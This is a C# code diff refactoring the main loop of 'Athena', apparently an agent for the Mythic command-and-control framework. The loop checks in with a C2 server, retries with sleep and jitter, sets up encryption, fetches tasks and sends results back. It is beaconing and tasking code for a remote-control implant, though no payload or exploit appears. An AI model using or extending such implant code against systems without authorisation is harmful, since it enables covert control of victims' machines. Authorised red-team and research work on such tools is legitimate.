@@ -14,58 +14,71 @@ namespace Athena
     {
         static void Main(string[] args)
         {
-            //https://www.youtube.com/watch?v=xdmdHMjK1KA
-            //1:36:39 for learning how to automatically generate the agents
+            int maxMissedCheckins = 5;
+            int missedCheckins = 0;
+            bool exit = false;
+        //https://www.youtube.com/watch?v=xdmdHMjK1KA
+        //1:36:39 for learning how to automatically generate the agents
 
-            //MythicClient controls all of the agent communications
-            MythicConfig conf = new MythicConfig();
-            Globals.mc = new MythicClient(conf);
+        //MythicClient controls all of the agent communications
+        Globals.mc = new MythicClient(new MythicConfig());
+            
+            //First Checkin-In attempt
             CheckinResponse res = Globals.mc.CheckIn();
+            
             //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
             while((res.status != "success"))
             {
+                //Attempt checkin again
                 res = Globals.mc.CheckIn();
-                Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter));
-                Globals.missedCheckins += 1;
 
-                if (Globals.missedCheckins == Globals.maxMissedCheckins)
+                //Sleep before attempting checkin again
+                Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter));
+                
+                //Increment checkins
+                missedCheckins += 1;
+
+                if (missedCheckins == maxMissedCheckins)
                 {
-                    Console.WriteLine("exiting");
+                    //bye bye
                     Environment.Exit(0);
                 }
             }
+            
+            //We checked in successfully, reset to 0
+            missedCheckins = 0;
+
             //Update our agent information with the response from the server.
-            Globals.missedCheckins = 0;
             Globals.mc.MythicConfig.uuid = res.id;
             if (Globals.encrypted)
             {
-                if(Globals.mc.MythicConfig.httpConfig.encryptedExchangeCheck && !String.IsNullOrEmpty(res.encryption_key))
+                if(Globals.mc.MythicConfig.currentConfig.encryptedExchangeCheck && !String.IsNullOrEmpty(res.encryption_key))
                 {
-                    Globals.mc.MythicConfig.httpConfig.crypt = new PSKCrypto(res.id, res.encryption_key);
+                    Globals.mc.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, res.encryption_key);
                 }
                 else
                 {
-                    Globals.mc.MythicConfig.httpConfig.crypt = new PSKCrypto(res.id, Globals.mc.MythicConfig.httpConfig.psk);
+                    Globals.mc.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, Globals.mc.MythicConfig.currentConfig.psk);
                 }
             }
 
-
             //Main Loop
             //Need to add the missed checkins check here.
-            while (!(Globals.missedCheckins == Globals.maxMissedCheckins) & !Globals.exit)
+            while (!(missedCheckins == maxMissedCheckins) & !exit)
             {
                 List<MythicTask> tasks = Globals.mc.GetTasks();
                 if (tasks == null)
                 {
-                    Globals.missedCheckins += 1;
-                    if (Globals.missedCheckins == Globals.maxMissedCheckins)
+                    missedCheckins += 1;
+                    if (missedCheckins == maxMissedCheckins)
                     {
                         Environment.Exit(0);
                     }
                 }
                 else
                 {
-                    Globals.missedCheckins = 0;
+                    missedCheckins = 0;
+                    missedCheckins = 0;
                     //Kick off Tasks
                     foreach (var task in tasks)
                     {
@@ -106,7 +119,7 @@ namespace Athena
                     if (hasoutput.Count > 0)
                     {
                         //Did the POST send properly?
-                        if (Globals.mc.PostResponse(hasoutput))
+                        if (Globals.mc.SendResponse(hasoutput))
                         {
                             //Remove sent commands from the Global job Dictionary or clear out taskresult of long running tasks
                             foreach (var job in hasoutput.Values)
@@ -120,9 +133,11 @@ namespace Athena
                                 else
                                 {
                                     string sent = Globals.jobs[job.task.id].taskresult;
-                                    
-                                    //Hopefully this fixes the issue with missing text being returned to the server.
-                                    Globals.jobs[job.task.id].taskresult = Globals.jobs[job.task.id].taskresult.Replace(sent, "");
+                                    if (!String.IsNullOrEmpty(Globals.jobs[job.task.id].taskresult))
+                                    {
+                                        //Hopefully this fixes the issue with missing text being returned to the server.
+                                        Globals.jobs[job.task.id].taskresult = Globals.jobs[job.task.id].taskresult.Replace(sent, "");
+                                    }
                                 }
                             }
                         }
